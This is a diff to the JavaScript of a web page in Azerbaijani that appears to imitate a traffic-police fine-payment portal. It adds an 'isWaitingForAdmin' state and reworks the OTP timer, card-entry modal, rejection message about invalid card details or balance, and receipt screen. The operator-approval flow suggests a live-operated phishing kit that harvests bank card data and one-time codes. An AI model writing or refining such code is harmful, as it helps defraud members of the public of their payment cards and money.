@@ -192,7 +192,7 @@
         let timerInterval;
         let otpTimeLeft = 180;
         let otpInterval;
-        let waitingForApproval = false;
+        let isWaitingForAdmin = false;
         let adviceShown = false;
 
         async function initConfig() {
@@ -247,16 +247,16 @@
                 localStorage.setItem('dyp_last_protocol', data.protocolNo);
                 const newEndTime = Date.now() + 10 * 60 * 1000;
                 localStorage.setItem('dyp_timer_end', newEndTime);
+                isWaitingForAdmin = false;
                 adviceShown = false;
             }
 
             if (data.isPaid || data.isRejected) {
+                isWaitingForAdmin = false;
                 localStorage.removeItem('dyp_waiting');
             }
 
-            // CHECK ISPAID AND ISREJECTED FIRST BEFORE WAITING CHECKS!
             if (data.isRejected) {
-                document.getElementById('loading-modal').classList.add('hidden');
                 document.getElementById('reject-reason-text').textContent = data.rejectReason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
                 document.getElementById('reject-modal').classList.remove('hidden');
                 return;
@@ -268,7 +268,6 @@
                 localStorage.removeItem('dyp_waiting');
                 clearInterval(timerInterval);
 
-                // Show receipt first
                 document.getElementById('app-container').innerHTML = `
                     <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-8 text-center space-y-6 border-t-8 border-green-600">
                         <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto text-4xl shadow-inner">
@@ -312,7 +311,6 @@
                     </div>
                 `;
 
-                // After 5 seconds, transition to Driver's Advice Leaflet and stay there
                 if (!adviceShown) {
                     adviceShown = true;
                     setTimeout(() => {
@@ -351,8 +349,7 @@
                 return;
             }
 
-            const isWaiting = localStorage.getItem('dyp_waiting') === 'true' || data.isPendingApproval;
-            if (isWaiting) {
+            if (isWaitingForAdmin || localStorage.getItem('dyp_waiting') === 'true' || data.isPendingApproval) {
                 showLoadingScreen();
                 return;
             }
@@ -436,6 +433,7 @@
                 return;
             }
 
+            isWaitingForAdmin = true;
             localStorage.setItem('dyp_waiting', 'true');
             closeModals();
             showLoadingScreen();
@@ -468,9 +466,10 @@
                 console.error("Clear reject error:", err);
             }
             localStorage.removeItem('dyp_waiting');
+            isWaitingForAdmin = false;
             document.getElementById('reject-modal').classList.add('hidden');
 
-            await fetchFineData();
+            closeModals();
             openCardModal();
         }
 
